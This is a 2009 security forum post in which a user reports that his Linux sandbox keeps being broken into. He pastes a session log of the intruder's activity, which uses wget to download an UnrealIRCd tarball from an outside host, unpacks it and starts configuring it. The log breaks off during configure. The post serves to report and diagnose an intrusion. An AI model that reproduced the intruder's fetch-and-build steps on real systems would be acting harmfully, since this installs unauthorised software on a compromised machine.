---
title: "???uNkn0wn Crew???UnrealIRCd???"
date: 2009-03-25
forum: Security
---

### Post by jmap82 on 2009-03-25
This is the second time in two months on two different installations that my system has been hacked and had some random IRC client installed on it without my knowledge.

The first time it happened was on my Hardy Heron installation and I just figured it was something strange having to do with an update.  But I when came home on one occasion and found my terminal open with the remnants of a configuration it had just run still in the window, I started to realize something messed up was going on.  Fortunately, this computer is my Linux sandbox, so I don't have any private files on here, so I thought I would wait and see if anything else happened.  Sure enough, about a week later, I woke up in the morning to an open terminal with some unfamiliar commands which looked like they were trying to open a back port on my computer.  From there, I reformatted and I'm now running Intrepid Ibex.  I got everything set up the way I wanted it with similar accessibility as the previous install.  This time I made it so that my terminal will log a script of all session output for every terminal session.  Its been about two weeks on this fresh install and just yesterday the hack came back.  This is all of the session output from whatever or whoever's interaction with my computer with.

```

]0;jmap82@JMAP2: ~jmap82@JMAP2:~$ Script started on Sat 21 Mar 2009 11:40:41 PM JST
]0;jmap82@JMAP2: ~jmap82@JMAP2:~$ uti[K[K[Kuptime

 23:40:52 up 2 days, 13:57,  3 users,  load average: 0.08, 0.05, 0.00

]0;jmap82@JMAP2: ~jmap82@JMAP2:~$ wget http://www.drshells.com/ircd.tar.gz

--2009-03-21 23:41:27--  http://www.drshells.com/ircd.tar.gz

Resolving www.drshells.com... 69.64.49.32

Connecting to www.drshells.com|69.64.49.32|:80... connected.

HTTP request sent, awaiting response... 200 OK

Length: 2547845 (2.4M) [application/x-gzip]

Saving to: `ircd.tar.gz'




 0% [                                       ] 0           --.-K/s              
 0% [                                       ] 9,866       28.2K/s              
 1% [                                       ] 40,274      57.6K/s              
 5% [=>                                     ] 137,290      148K/s              
 8% [==>                                    ] 227,066      186K/s              
17% [=====>                                 ] 455,850      319K/s              
28% [==========>                            ] 725,178      444K/s              
42% [===============>                       ] 1,079,938    587K/s              
60% [======================>                ] 1,551,986    759K/s              
62% [=======================>               ] 1,585,290    697K/s              
94% [===================================>   ] 2,397,618    966K/s              
100%[======================================>] 2,547,845    959K/s   in 2.6s    



2009-03-21 23:41:30 (959 KB/s) - `ircd.tar.gz' saved [2547845/2547845]



]0;jmap82@JMAP2: ~jmap82@JMAP2:~$ tar -zxvf ircd.tar.gz

linux/

linux/CVS/

linux/aliases/

linux/.CHANGES.NEW

linux/.CONFIG.RANT

linux/.RELEASE.NOTES

linux/.SICI

linux/.UPDATE

linux/.bugreport.gdb

linux/.cvsignore

linux/.indent.pro

linux/Changes

linux/Changes.old

linux/Config

linux/Donation

linux/INSTALL.REMOTEINC

linux/LICENSE

linux/Makefile

linux/README

linux/Unreal.nfo

linux/badwords.channel.conf

linux/badwords.message.conf

linux/badwords.quit.conf

linux/config.guess

linux/config.sub

linux/configure

linux/curl-ca-bundle.crt

linux/curlinstall

linux/dccallow.conf

linux/help.conf

linux/install-sh

linux/m_template.c

linux/makefile.win32

linux/modulize

linux/newnet

linux/spamfilter.conf

linux/Makefile.in

linux/update

linux/wircd.def

linux/autoconf/

linux/doc/

linux/extras/

linux/include/

linux/ircdcron/

linux/keys/

linux/networks/

linux/src/

linux/unreal

linux/motd.conf

linux/rules.conf

linux/unrealircd.conf

linux/ircd.log

linux/unreal.in

linux/src/CVS/

linux/src/modules/

linux/src/Makefile

linux/src/aln.c

linux/src/api-command.c

linux/src/api-isupport.c

linux/src/auth.c

linux/src/channel.c

linux/src/charsys.c

linux/src/cidr.c

linux/src/cloak.c

linux/src/crule.c

linux/src/dbuf.c

linux/src/events.c

linux/src/extbans.c

linux/src/extcmodes.c

linux/src/fdlist.c

linux/src/fdmaxcounter.c

linux/src/hash.c

linux/src/help.c

linux/src/ircd.c

linux/src/ircsprintf.c

linux/src/list.c

linux/src/lusers.c

linux/src/match.c

linux/src/md5.c

linux/src/modules.c

linux/src/packet.c

linux/src/parse.c

linux/src/random.c

linux/src/res.c

linux/src/s_auth.c

linux/src/s_bsd.c

linux/src/s_conf.c

linux/src/s_debug.c

linux/src/s_err.c

linux/src/s_extra.c

linux/src/s_kline.c

linux/src/s_misc.c

linux/src/s_numeric.c

linux/src/s_serv.c

linux/src/s_svs.c

linux/src/s_user.c

linux/src/scache.c

linux/src/send.c

linux/src/socket.c

linux/src/ssl.c

linux/src/ssl.cnf

linux/src/strtoul.c

linux/src/support.c

linux/src/timesynch.c

linux/src/umodes.c

linux/src/updconf.c

linux/src/url.c

linux/src/version.c.SH

linux/src/whowas.c

linux/src/zip.c

linux/src/win32/

linux/src/win32/CVS/

linux/src/win32/Icon1.ico

linux/src/win32/Win32GUI.rc

linux/src/win32/Win32New.h

linux/src/win32/areslib.lib

linux/src/win32/bar.bmp

linux/src/win32/compilerhelp.c

linux/src/win32/config.c

linux/src/win32/debug.c

linux/src/win32/def-clean.c

linux/src/win32/editor.c

linux/src/win32/encpem.bat

linux/src/win32/gpl.rtf

linux/src/win32/gplplusssl.rtf

linux/src/win32/gui.c

linux/src/win32/hand.CUR

linux/src/win32/leavealone.h

linux/src/win32/makecert.bat

linux/src/win32/resource.h

linux/src/win32/rtf.c

linux/src/win32/service.c

linux/src/win32/toolbar.bmp

linux/src/win32/tre.dll

linux/src/win32/tre.lib

linux/src/win32/unreal.bmp

linux/src/win32/unreal.c

linux/src/win32/unreal.rc

linux/src/win32/unrealinst.iss

linux/src/win32/win32.c

linux/src/win32/win32.h

linux/src/win32/wircd.exe.manifest

linux/src/win32/CVS/Root

linux/src/win32/CVS/Repository

linux/src/win32/CVS/Entries

linux/src/win32/CVS/Tag

linux/src/modules/CVS/

linux/src/modules/Makefile.in

linux/src/modules/cloak.c

linux/src/modules/l_commands.c

linux/src/modules/m_addline.c

linux/src/modules/m_addmotd.c

linux/src/modules/m_addomotd.c

linux/src/modules/m_admin.c

linux/src/modules/m_adminchat.c

linux/src/modules/m_akill.c

linux/src/modules/m_away.c

linux/src/modules/m_botmotd.c

linux/src/modules/m_chatops.c

linux/src/modules/m_chghost.c

linux/src/modules/m_chgident.c

linux/src/modules/m_chgname.c

linux/src/modules/m_chmodetst.c

linux/src/modules/m_close.c

linux/src/modules/m_connect.c

linux/src/modules/m_cycle.c

linux/src/modules/m_dccallow.c

linux/src/modules/m_dccdeny.c

linux/src/modules/m_dummy.c

linux/src/modules/m_eos.c

linux/src/modules/m_globops.c

linux/src/modules/m_guest.c

linux/src/modules/m_help.c

linux/src/modules/m_htm.c

linux/src/modules/m_invite.c

linux/src/modules/m_ison.c

linux/src/modules/m_join.c

linux/src/modules/m_kick.c

linux/src/modules/m_kill.c

linux/src/modules/m_knock.c

linux/src/modules/m_lag.c

linux/src/modules/m_links.c

linux/src/modules/m_list.c

linux/src/modules/m_locops.c

linux/src/modules/m_lusers.c

linux/src/modules/m_map.c

linux/src/modules/m_message.c

linux/src/modules/m_mkpasswd.c

linux/src/modules/m_mode.c

linux/src/modules/m_motd.c

linux/src/modules/m_nachat.c

linux/src/modules/m_names.c

linux/src/modules/m_netinfo.c

linux/src/modules/m_nick.c

linux/src/modules/m_oper.c

linux/src/modules/m_part.c

linux/src/modules/m_opermotd.c

linux/src/modules/m_pass.c

linux/src/modules/m_pingpong.c

linux/src/modules/m_protoctl.c

linux/src/modules/m_quit.c

linux/src/modules/m_rakill.c

linux/src/modules/m_rping.c

linux/src/modules/m_rules.c

linux/src/modules/m_sajoin.c

linux/src/modules/m_samode.c

linux/src/modules/m_sapart.c

linux/src/modules/m_sdesc.c

linux/src/modules/m_sendsno.c

linux/src/modules/m_sendumode.c

linux/src/modules/m_server.c

linux/src/modules/m_sethost.c

linux/src/modules/m_setident.c

linux/src/modules/m_setname.c

linux/src/modules/m_silence.c

linux/src/modules/m_sjoin.c

linux/src/modules/m_sqline.c

linux/src/modules/m_squit.c

linux/src/modules/m_stats.c

linux/src/modules/m_svsfline.c

linux/src/modules/m_svsjoin.c

linux/src/modules/m_svskill.c

linux/src/modules/m_svslusers.c

linux/src/modules/m_svsmode.c

linux/src/modules/m_svsmotd.c

linux/src/modules/m_svsnick.c

linux/src/modules/m_svsnline.c

linux/src/modules/m_svsnoop.c

linux/src/modules/m_svso.c

linux/src/modules/m_svspart.c

linux/src/modules/m_svssilence.c

linux/src/modules/m_svssno.c

linux/src/modules/m_svswatch.c

linux/src/modules/m_swhois.c

linux/src/modules/m_time.c

linux/src/modules/m_tkl.c

linux/src/modules/m_topic.c

linux/src/modules/m_trace.c

linux/src/modules/m_tsctl.c

linux/src/modules/m_umode2.c

linux/src/modules/m_undccdeny.c

linux/src/modules/m_unkline.c

linux/src/modules/m_unsqline.c

linux/src/modules/m_unzline.c

linux/src/modules/m_user.c

linux/src/modules/m_userhost.c

linux/src/modules/m_userip.c

linux/src/modules/m_vhost.c

linux/src/modules/m_wallops.c

linux/src/modules/m_watch.c

linux/src/modules/m_who.c

linux/src/modules/m_whois.c

linux/src/modules/m_whowas.c

linux/src/modules/module.def

linux/src/modules/webtv.c

linux/src/modules/CVS/Root

linux/src/modules/CVS/Repository

linux/src/modules/CVS/Entries

linux/src/modules/CVS/Tag

linux/src/CVS/Root

linux/src/CVS/Repository

linux/src/CVS/Entries

linux/src/CVS/Tag

linux/networks/CVS/

linux/networks/awesomechristians.network

linux/networks/axenet.network

linux/networks/bunker7.network

linux/networks/burnnet.network

linux/networks/cabonet.network

linux/networks/chatcrap.network

linux/networks/chatuniverse.network

linux/networks/ctcp.network

linux/networks/darkkaos.network

linux/networks/digitalirc.network

linux/networks/discussioni.network

linux/networks/dragonwings.network

linux/networks/gamescafe.network

linux/networks/german-elite.network

linux/networks/german-global-irc.network

linux/networks/global-irc.network

linux/networks/icechat.network

linux/networks/globalchat.network

linux/networks/infinity.network

linux/networks/ircsystems.network

linux/networks/isno.network

linux/networks/l33t-irc.network

linux/networks/lcirc.network

linux/networks/makenet

linux/networks/networks.ndx

linux/networks/outsiderz.network

linux/networks/phazenet.network

linux/networks/stormdancing.network

linux/networks/template.network

linux/networks/thainet.network

linux/networks/unitedirc-org.network

linux/networks/unreal-test.network

linux/networks/wazzza.network

linux/networks/x-irc.network

linux/networks/zirc.network

linux/networks/CVS/Root

linux/networks/CVS/Repository

linux/networks/CVS/Entries

linux/networks/CVS/Tag

linux/keys/CVS/

linux/keys/.KEYS

linux/keys/CVS/Root

linux/keys/CVS/Repository

linux/keys/CVS/Entries

linux/keys/CVS/Tag

linux/ircdcron/CVS/

linux/ircdcron/ircd.cron

linux/ircdcron/ircdchk.in

linux/ircdcron/CVS/Root

linux/ircdcron/CVS/Repository

linux/ircdcron/CVS/Entries

linux/ircdcron/CVS/Tag

linux/include/CVS/

linux/include/badwords.h

linux/include/auth.h

linux/include/channel.h

linux/include/class.h

linux/include/common.h

linux/include/config.h

linux/include/dbuf.h

linux/include/dynconf.h

linux/include/events.h

linux/include/fdlist.h

linux/include/h.h

linux/include/hash.h

linux/include/inet.h

linux/include/ircsprintf.h

linux/include/license.h

linux/include/macros.h

linux/include/md5.h

linux/include/modules.h

linux/include/modversion.h

linux/include/msg.h

linux/include/nameser.h

linux/include/numeric.h

linux/include/proto.h

linux/include/res.h

linux/include/resolv.h

linux/include/resource.h

linux/include/setup.h.in

linux/include/sjoin.h

linux/include/sock.h

linux/include/ssl.h

linux/include/struct.h

linux/include/sys.h

linux/include/threads.h

linux/include/types.h

linux/include/url.h

linux/include/version.h

linux/include/whowas.h

linux/include/zip.h

linux/include/win32/

linux/include/common.h~

linux/include/win32/CVS/

linux/include/win32/tre-config.h

linux/include/win32/regex.h

linux/include/win32/setup.h

linux/include/win32/ares/

linux/include/win32/ares/CVS/

linux/include/win32/ares/ares.h

linux/include/win32/ares/setup.h

linux/include/win32/ares/ares_version.h

linux/include/win32/ares/CVS/Root

linux/include/win32/ares/CVS/Repository

linux/include/win32/ares/CVS/Entries

linux/include/win32/ares/CVS/Tag

linux/include/win32/CVS/Root

linux/include/win32/CVS/Repository

linux/include/win32/CVS/Entries

linux/include/win32/CVS/Tag

linux/include/CVS/Root

linux/include/CVS/Repository

linux/include/CVS/Entries

linux/include/CVS/Tag

linux/extras/CVS/

linux/extras/defizzer.c

linux/extras/burst.c

linux/extras/regex/

linux/extras/c-ares.tar.gz

linux/extras/channeldumper.c

linux/extras/extras.txt

linux/extras/m_rawto.c

linux/extras/malloc.c

linux/extras/tre.tar.gz

linux/extras/regex/CVS/

linux/extras/regex/moo/

linux/extras/regex/Makefile.in

linux/extras/regex/README

linux/extras/regex/configure

linux/extras/regex/configure.in

linux/extras/regex/regex.c

linux/extras/regex/regex.h

linux/extras/regex/moo/CVS/

linux/extras/regex/moo/Makefile

linux/extras/regex/moo/CVS/Root

linux/extras/regex/moo/CVS/Repository

linux/extras/regex/moo/CVS/Entries

linux/extras/regex/moo/CVS/Tag

linux/extras/regex/CVS/Root

linux/extras/regex/CVS/Repository

linux/extras/regex/CVS/Entries

linux/extras/regex/CVS/Tag

linux/extras/CVS/Root

linux/extras/CVS/Repository

linux/extras/CVS/Entries

linux/extras/CVS/Tag

linux/doc/CVS/

linux/doc/example.conf

linux/doc/Authors

linux/doc/coding-guidelines

linux/doc/compiling_win32.txt

linux/doc/example.bg.conf

linux/doc/example.de.conf

linux/doc/example.fr.conf

linux/doc/example.hu.conf

linux/doc/example.nl.conf

linux/doc/example.ru.conf

linux/doc/help.de.conf

linux/doc/help.fr.conf

linux/doc/help.ru.conf

linux/doc/tao.of.irc

linux/doc/translations.txt

linux/doc/unreal32docs.de.html

linux/doc/unreal32docs.es.html

linux/doc/unreal32docs.fr.html

linux/doc/technical/

linux/doc/unreal32docs.gr.html

linux/doc/unreal32docs.html

linux/doc/unreal32docs.hu.html

linux/doc/unreal32docs.nl.html

linux/doc/unreal32docs.ru.html

linux/doc/unreal32docs.tk.html

linux/doc/technical/CVS/

linux/doc/technical/base64.txt

linux/doc/technical/005.txt

linux/doc/technical/protoctl.txt

linux/doc/technical/serverprotocol.html

linux/doc/technical/token.txt

linux/doc/technical/vl.txt

linux/doc/technical/CVS/Root

linux/doc/technical/CVS/Repository

linux/doc/technical/CVS/Entries

linux/doc/technical/CVS/Tag

linux/doc/CVS/Root

linux/doc/CVS/Repository

linux/doc/CVS/Entries

linux/doc/CVS/Tag

linux/autoconf/CVS/

linux/autoconf/Makefile

linux/autoconf/aclocal.m4

linux/autoconf/configure.in

linux/autoconf/CVS/Root

linux/autoconf/CVS/Repository

linux/autoconf/CVS/Entries

linux/autoconf/CVS/Tag

linux/aliases/CVS/

linux/aliases/aliases.conf

linux/aliases/anope.conf

linux/aliases/auspice.conf

linux/aliases/cygnus.conf

linux/aliases/epona.conf

linux/aliases/generic.conf

linux/aliases/genericstats.conf

linux/aliases/ircservices.conf

linux/aliases/operstats.conf

linux/aliases/CVS/Root

linux/aliases/CVS/Repository

linux/aliases/CVS/Entries

linux/aliases/CVS/Tag

linux/CVS/Root

linux/CVS/Repository

linux/CVS/Entries

linux/CVS/Tag

]0;jmap82@JMAP2: ~jmap82@JMAP2:~$ cd linux

]0;jmap82@JMAP2: ~/linuxjmap82@JMAP2:~/linux$ ./Config

[H[2J

 _   _                      _ ___________  _____     _

| | | |                    | |_   _| ___ \/  __ \   | |

| | | |_ __  _ __ ___  __ _| | | | | |_/ /| /  \/ __| |

| | | | '_ \| '__/ _ \/  _ | | | | |    / | |    /  _ |

| |_| | | | | | |  __/ (_| | |_| |_| |\ \ | \__/\ (_| |

 \___/|_| |_|_|  \___|\__,_|_|\___/\_| \_| \____/\__,_|



                               Configuration Program

                                for Unreal3.2.5

                                    

This program will help you to compile your IRC server, and ask you

questions regarding the compile-time settings of it during the process. 

regarding the setup of it, during the process.



If you have problems regarding the setup & compile, read Unreal.nfo to get

more information on where to get help. Please, before running this setup,

read the documentation in the "doc" folder. Docs are also avail online @

http://www.unrealircd.com/unreal32docs.html



[Enter to continue]

[H[2JUnreal3.2.5 Release Notes

==========================



If you are upgrading, please take a minute to read these release notes.

*NIX Users: PREFIX_AQ is now enabled by default. See under 'CHANGED' below.



If you are a coder and want to help out with Unreal3.3* development, then check 

out

http://dev.unrealircd.com/ and http://dev.unrealircd.com/wiki/Coders_Contest



==[ GENERAL INFORMATION ]==

- If you are upgrading on *NIX, make sure you run 'make clean' and './Config'

  first before doing 'make'

- The official UnrealIRCd documentation is doc/unreal32docs.html

  online version at: http://www.vulnscan.org/UnrealIRCd/unreal32docs.html

  FAQ: http://www.vulnscan.org/UnrealIRCd/faq/

  Read them before asking for help.

- Report bugs at http://bugs.unrealircd.org/

- When upgrading a network, we assume you are upgrading from the previous

  version (3.2.4). Upgrading from 3.2.3 is ok as well.

  However, if you have a network running with servers that are several versions 

behind

  (eg: 3.2.1) then you might experience small (desynch) problems.

[7m--More--(17%)[27m
  Please also minimize the time you have multiple versions running, a few days o

[7m--More--(18%)[27m
r[K

[7m--More--(18%)[27m
  one week is generally not a problem, but having mixed versions on a network fo

[7m--More--(19%)[27m
r several[K

[7m--More--(20%)[27m
  weeks or months is not recommended.

[7m--More--(20%)[27m

[K

[7m--More--(20%)[27m
==[ NEW ]==[K

[7m--More--(20%)[27m
- CGI:IRC Host spoofing support. This means you can mark certain CGI:IRC gateway

[7m--More--(22%)[27m
s[K

[7m--More--(22%)[27m
  as trusted, and then the IRCd will show the real IP/host everywhere for those

[7m--More--(23%)[27m
  users, instead of the IP/host of the CGI:IRC gateway. See docs section 4.36.

[7m--More--(24%)[27m
- Time synchronization support. This is enabled by default and will synch the IR

[7m--More--(26%)[27m
Cd[K

[7m--More--(26%)[27m
  clock when Unreal is started. This should get rid of most time differences, th

[7m--More--(27%)[27m
ough[K

[7m--More--(27%)[27m
  the clock can still be off 1-3 seconds. If for some reason no reply from the t

[7m--More--(29%)[27m
ime[K

[7m--More--(29%)[27m
  servers is received within 3 seconds, then the IRCd will continue to boot as u

[7m--More--(30%)[27m
sual.[K

[7m--More--(30%)[27m
  Several set::timesynch::* settings have been added, including set::timesynch::

[7m--More--(31%)[27m
enabled[K

[7m--More--(31%)[27m
  which you can set to 'no' to disable time synching (eg: because you already ru

[7m--More--(33%)[27m
n ntpd).[K

[7m--More--(33%)[27m
- NAMESX support. This (mostly) fixes a long-standing IRC protocol bug. If, for

[7m--More--(34%)[27m
  example, a user was +vo and then deops (-o), other clients could not always

[7m--More--(36%)[27m
  know the user was then still +v, now they can. Supported by XChat and newest m

[7m--More--(37%)[27m
IRC.[K

[7m--More--(37%)[27m
- Chained SSL certificates support

[7m--More--(38%)[27m
- Russian doc/example.ru.conf and Turkish doc/unreal32docs.tk.html

[7m--More--(39%)[27m

[K

[7m--More--(39%)[27m
==[ CHANGED ]==

[7m--More--(39%)[27m
- PREFIX_AQ (the ~ and & symbols for +q and +a) are now ENABLED BY DEFAULT on *N

[7m--More--(40%)[27m
IX.[K

[7m--More--(40%)[27m
  They have always been enabled on Windows, so it made sense to do the same for 

[7m--More--(42%)[27m
*NIX.[K

[7m--More--(42%)[27m
  Pretty much all major clients support it now (mIRC, xchat, irssi, epic, PJIRC,

[7m--More--(43%)[27m
  CGI:IRC, etc).

[7m--More--(43%)[27m
- If DNS info (*NIX: /etc/resolv.conf, Win: registry) is updated, a '/REHASH -dn

[7m--More--(45%)[27m
s'[K

[7m--More--(45%)[27m
  now rereads this info, no restart needed anymore.

[7m--More--(46%)[27m
- me::numeric can now be changed without a restart, if no servers are linked.

[7m--More--(47%)[27m
- Improved windows crash info: we now create minidumps, this should aid debuggin

[7m--More--(48%)[27m
g.[K

[7m--More--(48%)[27m
- '/quote dns i' (as an oper) now shows nameserver info again

[7m--More--(49%)[27m
- Local oper may now use /TRACE

[7m--More--(50%)[27m
- If channel is +m but -t, you now need at least voice (+v) to change the topic.

[7m--More--(51%)[27m
- When checking if someone is banned, we now always verify bans against the cloa

[7m--More--(52%)[27m
ked host,[K

[7m--More--(53%)[27m
  even if the user has a vhost and the cloaked host is not visible / unused.

[7m--More--(54%)[27m
- Extra binary compatibility checks: (gcc) compiler version

[7m--More--(55%)[27m
- Allow /*LINE'ing of literalident@* (eg: gline clones@*). Things like *clones@*

[7m--More--(56%)[27m
 are[K

[7m--More--(56%)[27m
  still denied though, and this will not be changed. Use services AKILL instead.

[7m--More--(58%)[27m
- Command aliases: made empty parameters work if the alias allows it (eg, the al

[7m--More--(59%)[27m
ias[K

[7m--More--(59%)[27m
  uses .* as a regex and not .+)

[7m--More--(60%)[27m
- Moved another 2K lines from core to modules, this means 31K lines are now in m

[7m--More--(61%)[27m
odules[K

[7m--More--(61%)[27m
  and can be upgraded on the fly.

[7m--More--(62%)[27m
- Real Command Aliases: This makes it possible to, for example, alias '/GLINEBOT

[7m--More--(63%)[27m
' to[K

[7m--More--(63%)[27m
  'GLINE <param> 2d Bots are not permitted on this network, etcetc'. For more in

[7m--More--(64%)[27m
formation,[K

[7m--More--(64%)[27m
  see the docs on the alias block and/or search for "glinebot" in doc/example.co

[7m--More--(66%)[27m
nf.[K

[7m--More--(66%)[27m
- /etc/hosts is no longer checked (it never did before 3.2.3 either)

[7m--More--(67%)[27m

[K

[7m--More--(67%)[27m
==[ MAJOR BUGS FIXED ]==

[7m--More--(67%)[27m
- Spamfilter was not always working properly

[7m--More--(68%)[27m
- MS Visual studio 2005 (8.x) was unable to compile Unreal and/or caused crashes

[7m--More--(69%)[27m
- Certain IPv6 listen blocks could crash the ircd on-boot/on-rehash

[7m--More--(71%)[27m

[K

[7m--More--(71%)[27m
==[ MINOR BUGS FIXED ]==

[7m--More--(71%)[27m
- "Looking up your hostname" message was missing if set::options::show-connect-n

[7m--More--(72%)[27m
otice[K

[7m--More--(72%)[27m
  was enabled (other messages, like "looking up ident" were shown, however)

[7m--More--(74%)[27m
- It was sometimes impossible to update a link { } block: all old settings would

[7m--More--(75%)[27m
 still[K

[7m--More--(75%)[27m
  be used, this happened if connfreq was low. This might also have caused crashe

[7m--More--(76%)[27m
s.[K

[7m--More--(76%)[27m
- Netsynch problem, which could cause the wrong modes to be applied to a channel

[7m--More--(78%)[27m
 in[K

[7m--More--(78%)[27m
  some rare cases.

[7m--More--(78%)[27m
- Setting set::maxdccallow to 0 (or lower) still allowed one entry to be added

[7m--More--(80%)[27m
- Spamfilter oversized-checking is no longer done when removing a spamfilter

[7m--More--(81%)[27m
- Operator count bug (there might still be others...)

[7m--More--(82%)[27m
- Some chinese-* charsets could not be selected individually

[7m--More--(83%)[27m
- No longer requiring a C++ compiler (was caused by resolver in 3.2.4)

[7m--More--(84%)[27m
- Added workaround for "make: Permission denied" bug in some FreeBSD's

[7m--More--(85%)[27m

[K

[7m--More--(85%)[27m
==[ REMOVED ]==

[7m--More--(85%)[27m
- MS Visual Studio 6 support, but this did not work anymore anyway...

[7m--More--(86%)[27m

[K

[7m--More--(86%)[27m
==[ KNOWN ISSUES ]==

[7m--More--(87%)[27m
- Windows 2003: Crashes directly on-boot have been reported, while other W2003 s

[7m--More--(88%)[27m
ervers[K

[7m--More--(88%)[27m
  work perfectly fine (including the one we used for testing). No pattern in thi

[7m--More--(90%)[27m
s has[K

[7m--More--(90%)[27m
  been found yet, but the bug is somewhere in the resolver (c-ares).

[7m--More--(91%)[27m
- Regexes: Be careful with backreferences (\1, etc), certain regexes can slow th

[7m--More--(92%)[27m
e IRCd[K

[7m--More--(92%)[27m
  down considerably and even bring it to a near-halt. In the spamfilter user tar

[7m--More--(94%)[27m
get it's[K

[7m--More--(94%)[27m
  usually safe though.

[7m--More--(94%)[27m
- Regexes: Possessive quantifiers such as, for example, "++" (not to be confused

[7m--More--(95%)[27m
 with "+")[K

[7m--More--(96%)[27m
  are not safe to use, they can easily freeze the IRCd.

[7m--More--(97%)[27m
- Windows: The /RESTART command will work, but the second time you do a /RESTART

[7m--More--(98%)[27m
 the[K

[7m--More--(98%)[27m
  IRCd will "crash" with a dialogbox.

[7m--More--(99%)[27m

[K

[7m--More--(99%)[27m
==[ ADDITIONAL INFO ]==

[7m--More--(99%)[27m
* See Changelog for more details

[Enter to continue]

[H[2J

Many older operating systems have an insecure TCP/IP stack

which may be vulnerable to IP spoofing attacks, if you run

an operating system that is vulnerable to such attacks

enable this option. This option can also be useful to prevent

blind proxies from connecting (eg: HTTP POST proxies).



Do you want to enable the server anti-spoof protection?

[No] -> 



What directory are all the server configuration files in?

[/home/jmap82/linux] -> 



What is the path to the ircd binary including the name of the binary?

[/home/jmap82/linux/src/ircd] -> 



Would you like to compile as a hub or as a leaf?

Type Hub to select hub and Leaf to select leaf.

[Hub] -> 



What is the hostname of the server running your IRCd?

[JMAP2] -> 



What should the default permissions for your configuration files be? (Set this to 0 to disable)

It is strongly recommended that you use 0600 to prevent unwanted reading of the file

[0600] -> 



Do you want to support SSL (Secure Sockets Layer) connections?

[No] -> 



Do you want to enable IPv6 support?

[No] -> 



Do you want to enable ziplinks support?

[No] -> 



Do you want to enable remote includes?

[No] -> 



Do you want to enable prefixes for chanadmin and chanowner?

This will give +a the & prefix and ~ for +q (just like +o is @)

Supported by the major clients (mIRC, xchat, epic, eggdrop, Klient,

PJIRC, irssi, CGI:IRC, etc.)

This feature should be enabled/disabled network-wide.

[Yes] -> 



What listen() backlog value do you wish to use?  Some older servers

have problems with more than 5, others work fine with many more.

[5] -> 



How far back do you want to keep the nickname history?

[2000] -> 



What is the maximum sendq length you wish to have?

[3000000] -> 



How many buffer pools would you like?

This number will be multiplied by MAXSENDQLENGTH.

[18] -> 





How many file descriptors (or sockets) can the IRCd use?

[1024] -> 



Would you like any more parameters to configure?

Write them here:

[]-> 

./configure --with-showlistmodes --enable-hub --enable-prefixaq --with-listen=5 --with-dpath=/home/jmap82/linux --with-spath=/home/jmap82/linux/src/ircd --with-nick-history=2000 --with-sendq=3000000 --with-bufferpool=18 --with-hostname=JMAP2 --with-permissions=0600 --with-fd-setsize=1024 --enable-dynamic-linking





checking for gcc... gcc

checking for C compiler default output file name... 













a.out

checking whether the C compiler works... yes

checking whether we are cross compiling... no

checking for suffix of executables... 



checking for suffix of object files... o

checking whether we are using the GNU C compiler... 

yes

checking whether gcc accepts -g... yes

checking for gcc option to accept ANSI C... 







none needed

checking if gcc has a working -pipe... yes

checking for rm... /bin/rm

checking for cp... /bin/cp

checking for touch... /usr/bin/touch

checking for openssl... /usr/bin/openssl

checking for install... /usr/bin/install

checking for gmake... make

checking for gmake... no

checking for gunzip... /bin/gunzip

checking for pkg-config... /usr/bin/pkg-config

checking for crypt in -ldescrypt... no

checking for crypt in -lcrypt... yes

checking for socket in -lsocket... no

checking for inet_ntoa in -lnsl... yes

checking how to run the C preprocessor... gcc -E

checking for egrep... grep -E

checking for ANSI C header files... yes

checking for sys/types.h... yes

checking for sys/stat.h... yes

checking for stdlib.h... yes

checking for string.h... yes

checking for memory.h... yes

checking for strings.h... yes

checking for inttypes.h... yes

checking for stdint.h... yes

checking for unistd.h... yes

checking sys/param.h usability... yes

checking sys/param.h presence... yes

checking for sys/param.h... yes

checking for stdlib.h... (cached) yes

checking stddef.h usability... yes

checking stddef.h presence... yes

checking for stddef.h... yes

checking sys/syslog.h usability... yes

checking sys/syslog.h presence... yes

checking for sys/syslog.h... yes

checking for unistd.h... (cached) yes

checking for string.h... (cached) yes

checking for strings.h... (cached) yes

checking malloc.h usability... yes

checking malloc.h presence... yes

checking for malloc.h... yes

checking sys/rusage.h usability... no

checking sys/rusage.h presence... no

checking for sys/rusage.h... no

checking glob.h usability... yes

checking glob.h presence... yes

checking for glob.h... yes

checking for an ANSI C-conforming const... yes

checking for inline... inline

checking for size_t... yes

checking whether time.h and sys/time.h may both be included... yes

checking whether struct tm is in sys/time.h or time.h... time.h

checking for uid_t in sys/types.h... yes

checking for short... yes

checking size of short... 2

checking for int... yes

checking size of int... 4

checking for long... yes

checking size of long... 4

checking for int16_t... yes

checking for u_int16_t... yes

checking for int32_t... yes

checking for u_int32_t... yes

checking for rlim_t... no

checking size of rlim_t... 0

checking what kind of nonblocking sockets you have... O_NONBLOCK

checking whether gcc needs -traditional... no

checking whether setpgrp takes no argument... yes

checking for function prototypes... yes

checking whether setvbuf arguments are reversed... no

checking for working alloca.h... yes

checking for alloca... yes

checking for snprintf... yes

checking for vsnprintf... yes

checking for strlcpy... no

checking for strlcat... no

checking for strlncat... no

checking for inet_pton... yes

checking for inet_ntop... yes

checking if C99 variable length arrays are supported... yes

checking if we can set the core size to unlimited... yes

checking for vprintf... yes

checking for _doprnt... no

checking for gettimeofday... yes

checking for getrusage... yes

checking for setproctitle... no

checking for setproctitle in -lutil... no

checking for pstat... no

checking what type of signals you have... POSIX

checking for strtoken... no

checking for strtok... yes

checking for strerror... yes

checking for index... yes

checking for strtoul... yes

checking for bcopy... yes

checking for bcmp... yes

checking for bzero... yes

checking for strcasecmp... yes

checking for inet_addr... yes

checking for inet_ntoa... yes

checking for inet_netof... yes

checking for syslog... yes

checking for vsyslog... yes

checking for dlopen... no

checking for dlopen in -ldl... yes

checking if we need the -export-dynamic flag... yes

checking for compiler option to produce PIC... -fPIC -DPIC -shared

checking if your system prepends an underscore on symbols... no

checking if FD_SETSIZE is large enough to allow 1024 file descriptors... yes

extracting TRE regex library

configuring TRE regex library

checking build system type... i686-pc-linux-gnu

checking host system type... i686-pc-linux-gnu

checking target system type... i686-pc-linux-gnu

checking for a BSD-compatible install... /usr/bin/install -c

checking whether build environment is sane... yes

checking for gawk... no

checking for mawk... mawk

checking whether make sets $(MAKE)... yes

checking for gcc... gcc

checking for C compiler default output file name... a.out

checking whether the C compiler works... yes

checking whether we are cross compiling... no

checking for suffix of executables... 

checking for suffix of object files... o

checking whether we are using the GNU C compiler... yes

checking whether gcc accepts -g... yes

checking for gcc option to accept ANSI C... none needed

checking for style of include used by make... GNU

checking dependency style of gcc... gcc3

checking how to run the C preprocessor... gcc -E

checking for a BSD-compatible install... /usr/bin/install -c

